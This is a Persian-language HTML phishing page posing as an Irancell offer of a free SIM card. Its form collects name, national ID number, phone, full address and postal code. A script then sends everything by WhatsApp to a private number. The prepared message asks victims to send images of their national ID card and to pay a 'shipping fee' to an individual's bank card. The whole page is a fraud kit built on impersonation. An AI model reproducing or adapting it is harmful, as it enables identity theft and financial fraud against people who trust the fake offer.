<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>درخواست سیم‌کارت رایگان ایرانسل</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  padding: 20px;
  font-family: Tahoma, Arial, sans-serif;
  background: #f4f5f8;
  color: #202124;
  font-size: 20px;
}

.container {
  max-width: 650px;
  margin: 0 auto;
  background: #fff;
  border-radius: 24px;
  padding: 24px;
  box-shadow: 0 8px 35px #00000012;
}

.hero {
  height: 230px;
  background: #ffd500;
  border-radius: 20px;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  margin-bottom: 28px;
}

.hero img {
  width: 100%;
  height: 100%;
  object-fit: contain;
}

h1 {
  font-size: 30px;
  line-height: 1.8;
  text-align: center;
  margin: 0 0 10px;
}

.subtitle {
  text-align: center;
  font-size: 19px;
  line-height: 2;
  color: #555;
  margin-bottom: 28px;
}

.whatsapp-icon {
  width: 28px;
  height: 28px;
  vertical-align: middle;
  margin-left: 6px;
}

.field {
  margin-bottom: 20px;
}

label {
  display: block;
  font-weight: bold;
  font-size: 21px;
  margin-bottom: 10px;
}

input[type="text"],
input[type="tel"] {
  width: 100%;
  padding: 17px;
  border: 2px solid #dedfe3;
  border-radius: 13px;
  font-family: inherit;
  font-size: 21px;
  outline: none;
  background: #fff;
}

input:focus {
  border-color: #f0c400;
}

input::placeholder {
  font-size: 19px;
  color: #999;
}

.address-reminder {
  background: #fff8d8;
  border-right: 5px solid #edc400;
  border-radius: 12px;
  padding: 15px;
  font-size: 18px;
  line-height: 2;
  margin-bottom: 12px;
}

.prefix-title {
  font-weight: bold;
  font-size: 21px;
  margin-bottom: 12px;
}

.prefix-grid {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: 12px;
}

.prefix-option {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  padding: 18px;
  border: 2px solid #e2e2e2;
  border-radius: 14px;
  cursor: pointer;
  direction: ltr;
  font-size: 23px;
  font-weight: bold;
}

.prefix-option input {
  width: 22px;
  height: 22px;
  accent-color: #edc400;
  flex-shrink: 0;
}

.prefix-option:has(input:checked) {
  border-color: #e7bd00;
  background: #fffbe8;
}

.terms {
  display: flex;
  align-items: flex-start;
  gap: 12px;
  margin: 24px 0;
  font-size: 18px;
  line-height: 2;
}

.terms input {
  width: 22px;
  height: 22px;
  margin-top: 8px;
  flex-shrink: 0;
  accent-color: #159447;
}

button {
  width: 100%;
  border: 0;
  border-radius: 14px;
  padding: 19px;
  background: #ffd500;
  color: #171717;
  font-family: inherit;
  font-size: 23px;
  font-weight: bold;
  cursor: pointer;
}

button:hover {
  background: #f2ca00;
}

@media (max-width: 450px) {
  body {
    padding: 12px;
  }

  .container {
    padding: 17px;
  }

  h1 {
    font-size: 25px;
  }

  .hero {
    height: 190px;
  }

  .prefix-option {
    padding: 14px 10px;
    font-size: 20px;
  }
}
</style>
</head>

<body>
<main class="container">

  <div class="hero">
    <img
      src="https://commons.wikimedia.org/wiki/Special:FilePath/Sim_card.png"
      alt="تصویر سیم‌کارت"
    >
  </div>

  <h1>درخواست سیم‌کارت رایگان ایرانسل</h1>

  <div class="subtitle">
    <svg class="whatsapp-icon" viewBox="0 0 32 32" aria-label="واتساپ" role="img">
      <path fill="#25D366" d="M16 .8A15.1 15.1 0 0 0 3.1 23.7L1 31l7.5-2A15.2 15.2 0 1 0 16 .8z"/>
      <path fill="#fff" d="M16 4.2a11.7 11.7 0 0 0-10 17.8l.3.5-1.2 4.3 4.4-1.2.4.3A11.7 11.7 0 1 0 16 4.2zm6.5 16.7c-.3.8-1.7 1.5-2.4 1.6-.7.1-1.5.2-2.4-.1-.6-.2-1.3-.4-2.2-.8-3.9-1.7-6.4-5.7-6.6-6-.2-.3-1.6-2.1-1.6-4s1-2.8 1.4-3.2c.3-.4.8-.5 1-.5h.7c.2 0 .5-.1.8.6l1.1 2.7c.1.2.1.5 0 .7l-.4.6-.6.7c-.2.2-.4.4-.2.8.2.4.9 1.5 1.9 2.4 1.3 1.2 2.4 1.6 2.8 1.8.4.2.6.2.8-.1l1.1-1.3c.3-.4.5-.3.9-.2l2.6 1.2c.4.2.7.3.8.5.1.2.1 1-.2 1.8z"/>
    </svg>
    فرم پس از تکمیل شدن به صورت یک پیام آماده در واتساب ارسال خواهد شد
  </div>

  <form id="requestForm">

    <div class="field">
      <label for="firstName">نام</label>
      <input id="firstName" name="firstName" type="text" placeholder="نام خود را وارد کنید" required>
    </div>

    <div class="field">
      <label for="lastName">نام خانوادگی</label>
      <input id="lastName" name="lastName" type="text" placeholder="نام خانوادگی خود را وارد کنید" required>
    </div>

    <div class="field">
      <label for="nationalCode">کد ملی</label>
      <input id="nationalCode" name="nationalCode" type="text" inputmode="numeric" maxlength="10" placeholder="کد ملی ۱۰ رقمی" required>
    </div>

    <div class="field">
      <label for="phone">شماره تماس</label>
      <input id="phone" name="phone" type="tel" inputmode="tel" placeholder="شماره تلفن همراه" required>
    </div>

    <div class="field">
      <div class="address-reminder">
        📍 لطفاً آدرس خود را با دقت و به‌صورت کامل وارد کنید؛ سیم‌کارت به همین آدرس ارسال خواهد شد.
      </div>
      <label for="address">آدرس دقیق</label>
      <input id="address" name="address" type="text" placeholder="استان، شهر، خیابان، کوچه و پلاک" required>
    </div>

    <div class="field">
      <label for="postalCode">کد پستی</label>
      <input id="postalCode" name="postalCode" type="text" inputmode="numeric" maxlength="10" placeholder="کد پستی ۱۰ رقمی" required>
    </div>

    <div class="field">
      <div class="prefix-title">پیش‌شماره موردنظر را انتخاب کنید</div>
      <div class="prefix-grid">
        <label class="prefix-option">
          <span>0900</span>
          <input type="radio" name="prefix" value="0900" required>
        </label>

        <label class="prefix-option">
          <span>0903</span>
          <input type="radio" name="prefix" value="0903">
        </label>

        <label class="prefix-option">
          <span>0936</span>
          <input type="radio" name="prefix" value="0936">
        </label>

        <label class="prefix-option">
          <span>0930</span>
          <input type="radio" name="prefix" value="0930">
        </label>
      </div>
    </div>

    <label class="terms">
      <input type="checkbox" id="terms" required>
      <span>اینجانب صحت اطلاعات واردشده را تأیید می‌کنم و شرایط و قوانین اعلام‌شده را پذیرفته‌ام.</span>
    </label>

    <button type="submit">ادامه و ارسال در واتساپ</button>
  </form>
</main>

<script>
const WHATSAPP_NUMBER = "989365021596";

document.getElementById("requestForm").addEventListener("submit", function(event) {
  event.preventDefault();

  const firstName = document.getElementById("firstName").value.trim();
  const lastName = document.getElementById("lastName").value.trim();
  const nationalCode = document.getElementById("nationalCode").value.trim();
  const phone = document.getElementById("phone").value.trim();
  const address = document.getElementById("address").value.trim();
  const postalCode = document.getElementById("postalCode").value.trim();
  const selectedPrefix = document.querySelector('input[name="prefix"]:checked');

  if (!selectedPrefix) {
    alert("لطفاً پیش‌شماره را انتخاب کنید.");
    return;
  }

  const prefix = selectedPrefix.value;

  const message = `درخواست دریافت سیم‌کارت رایگان

━━━━━━━━━━━━━━━━━━

نام: ${firstName}
نام خانوادگی: ${lastName}
کد ملی: ${nationalCode}
شماره تماس: ${phone}
آدرس دقیق: ${address}
کد پستی: ${postalCode}
پیش‌شماره انتخابی: ${prefix}


اینجانب صحت اطلاعات واردشده را تأیید می‌کنم و شرایط و قوانین اعلام‌شده را پذیرفته‌ام.

━━━━━━━━━━━━━━━━━━

مراحل باقی‌مانده جهت تکمیل درخواست

۱. 📎 ارسال تصویر پشت و روی کارت ملی صاف و خوانا یا صفحه اول شناسنامه که نیمه باز یا تا شده نباشد

۲. 💳 واریز مبلغ ۲۹ هزار تومان بابت هزینه چاپ و ارسال مدارک

شماره کارت:
5022291098953209
به نام: حمیدرضا سلیمی

۳. 🧾 ارسال تصویر رسید واریز وجه به همراه مدارک هویتی

پس از ارسال مدارک و رسید پرداخت، سیمکارت شما فورا ارسال خواهد شد و ظرف ۱۰ الی ۲۰ روز کاری به دستتان خواهد رسید.

از انتخاب شما متشکریم`;

  const whatsappURL =
    "https://wa.me/" + WHATSAPP_NUMBER + "?text=" + encodeURIComponent(message);

  window.open(whatsappURL, "_blank", "noopener,noreferrer");
});
</script>

</body>
</html>
